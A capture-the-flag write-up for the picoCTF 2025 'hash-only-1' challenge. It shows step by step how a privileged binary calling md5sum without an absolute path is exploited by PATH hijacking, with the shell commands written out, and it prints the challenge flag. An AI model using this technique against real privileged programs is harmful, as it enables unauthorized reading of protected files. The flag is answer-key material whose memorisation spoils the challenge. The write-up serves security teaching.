# hash-only-1 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2025, Path Hijacking

## Description ##
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

## Approach ##
After starting the instance, I was given the option to download the binary. I downloaded the binary and ran strings flaghasher to inspect it for readable text. Among the extracted strings, I noticed the following lines:

    Computing the MD5 hash of /root/flag.txt....
    /bin/bash -c 'md5sum /root/flag.txt'

This means that the binary is using the md5sum command to hash the flag.txt file. The md5sum executable normally resides in standard system directories such as /bin or /usr/bin, and the program relies on the system environment to locate and execute it. Since my local environment doesn't contain md5sum, I connected to the instance via SSH to run the binary in its intended environment, where md5sum is available. When I ran the binary, I got:

    Computing the MD5 hash of /root/flag.txt....

    7779dbbe8c1228e3a7a3970faa41a89c  /root/flag.txt

After looking at the flaghasher binary again, I realized that md5sum is invoked without an absolute path, the program searches for it using the `$PATH` environment variable, so I can create a fake md5sum executable which is actually a cat command to display the flag. This works because the program will execute whatever is found first in the PATH. To accomplish this, I created a symbolic link named md5sum that points to the cat command, then I change the `$PATH` to have it search in the current directory first (this guarantee that the program will find my fake md5sum and execute it). 

    ctf-player@pico-chall$ echo $PATH
    -bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
    ctf-player@pico-chall$ ln -s /bin/cat md5sum
    ctf-player@pico-chall$ export PATH=".":$PATH
    ctf-player@pico-chall$ echo $PATH
    -bash: .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
    ctf-player@pico-chall$ ./flaghasher
    Computing the MD5 hash of /root/flag.txt....

    picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}

Flag: picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}

## Reflection ## 
This challenge was a good introduction to PATH hijacking. I learned that when a privileged binary invokes external commands without using absolute paths, it relies on the $PATH environment variable to resolve executables. By creating a symbolic link named md5sum that pointed to the cat command and modifying $PATH to search the current directory first, I was able to control which executable the program ran. This shows how improper command invocation can allow attackers to execute unintended programs and bypass intended security restrictions. 

